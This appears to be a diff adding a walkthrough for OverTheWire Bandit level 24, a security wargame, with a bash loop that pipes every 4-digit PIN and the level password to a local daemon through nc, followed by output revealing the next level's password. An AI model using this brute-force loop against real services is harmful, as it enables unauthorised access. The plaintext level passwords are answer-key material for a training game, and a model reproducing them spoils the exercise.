@@ -1,0 +1,25 @@
+1. Goal
+
+A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+
+2. Solution
+
+I need to write a script that checks 10000 combination, of course before creating a /tmp/XXXX folder.
+
+#!/bin/bash
+bandit24=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+for pin in {9999..0000}; do
+        echo "$bandit24 $pin"
+done | nc localhost 30002
+
+I get 
+
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+
